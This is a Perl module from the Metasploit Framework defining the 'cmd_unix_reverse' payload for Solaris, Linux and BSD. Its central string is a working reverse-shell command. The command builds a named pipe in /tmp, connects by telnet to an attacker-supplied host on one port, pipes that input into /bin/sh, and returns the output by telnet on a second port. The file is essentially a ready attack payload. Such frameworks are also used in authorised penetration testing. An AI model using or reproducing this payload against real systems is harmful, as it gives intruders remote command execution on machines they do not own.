package Msf::Payload::cmd_unix_reverse;
use strict;
use base 'Msf::CommandPayload';

my $info =
{
    'Name'         => 'cmd_unix_reverse',
    'Version'      => '1.0',
    'Description'  => 'Use telnet|sh|telnet to simulate reverse shell',
    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'         => [  ],
    'Priv'         => 0,
    'OS'           => [ 'solaris', 'linux', 'bsd' ],
    'Keys'         => ['cmd'], 
    'Multistage'   => 0,
    'Type'         => 'reverse_shell_split',
    'Size'         => '',
    'UserOpts'     =>
        {
            'LHOST'  => [1, 'ADDR', 'Address of the attacking system'],
            'LPORTA' => [1, 'PORT', 'Listening port for shell input'],
            'LPORTB' => [1, 'PORT', 'Listening port for shell output'],
        },

    # We create a fifo and force the first telnet process to read from it,
    # this prevents it from exiting if there is no stdin in the remote
    # environement. By piping the output of the second command into the
    # fifo, we can cause the whole sequence to exit cleanly
            
    'CommandPayload' =>
    "mknod /tmp/.msfin p;cat /tmp/.msfin|".
    "telnet [>LHOST<] [>LPORTA<]|/bin/sh 2>&1|telnet [>LHOST<] [>LPORTB<] >/tmp/.msfin 2>&1;".
    "rm -f /tmp/.msfin",
};

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info}, @_);
    return($self);
}
